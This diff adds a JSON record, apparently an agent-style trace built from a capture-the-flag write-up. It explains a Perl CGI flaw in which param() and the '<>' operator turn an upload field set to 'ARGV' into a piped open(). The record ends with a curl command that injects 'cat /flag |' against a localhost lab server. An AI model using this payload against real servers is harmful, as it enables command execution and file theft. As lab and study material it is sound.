@@ -1,0 +1,10 @@
+[
+    {
+        "type": "thought",
+        "content": "This challenge is quite interesting, it focuses on perl 5 vulnerable which is presented at blackhat asia 2016.\nTake a first look, the site is so simple. I decided to check file.pl This page allows user upload everything, then print back its content:based on what it does, i guess the code may look like this:\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\nuse strict;\nuse warnings;\nuse CGI;\n \nmy $cgi= CGI->new;\nif ( $cgi->upload( 'file' ) )\n{\nmy $file= $cgi->param( 'file' );\nwhile ( <$file> ) { print \"$_\"; } }\nSo what the problem? \n\nLook at this line\n\n1\nmy $file= $cgi->param( 'file' )\nparam() returns a LIST of ALL the parameter values but only the first value is inserted into $file\n\nNext\n\n1\nwhile ( <$file>)\n\u201c<>\u201d doesn\u2019t work with strings unless the string is \u201cARGV\u201d, so it loops through the ARG values and inserting each one to an open() call\n=> We can read content of any file by assign the scalar value first, so $file will be assigned our scalar value instead of the uploaded file descriptor"
+    },
+    {
+        "type": "execution",
+        "content": "echo \"asdf\" | curl -F \"file=ARGV\" -F \"file=@-\" \"http://localhost:8081/cgi-bin/file.pl?cat%20%2fflag%20|\""
+    }
+]
